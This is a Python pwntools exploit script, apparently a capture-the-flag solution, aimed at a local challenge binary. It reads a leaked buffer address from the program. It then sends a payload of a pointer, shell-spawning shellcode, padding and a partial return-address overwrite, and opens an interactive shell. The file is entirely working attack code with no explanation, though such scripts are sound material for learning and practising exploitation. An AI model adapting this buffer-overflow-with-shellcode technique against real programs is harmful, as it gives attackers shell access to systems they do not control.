#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("localhost", 9007)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *vuln+84
        b *main+45
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


p.recvuntil("Name @>")
buf_start_addr = eval(p.recv(14))
log.info('buffer start addresss : 0x{:08x}'.format(buf_start_addr))
shellcode = asm(shellcraft.sh())
buffer_len = 258

payload = p64(buf_start_addr + 0x8)
payload += shellcode
payload += b"A" * (buffer_len - len(payload) -2)
payload += bytes([(buf_start_addr & 0xff) - 8, (buf_start_addr & 0xff00) >> 8])

p.recvuntil("Name>")
sleep(0.5)
p.sendline(payload)

p.interactive()
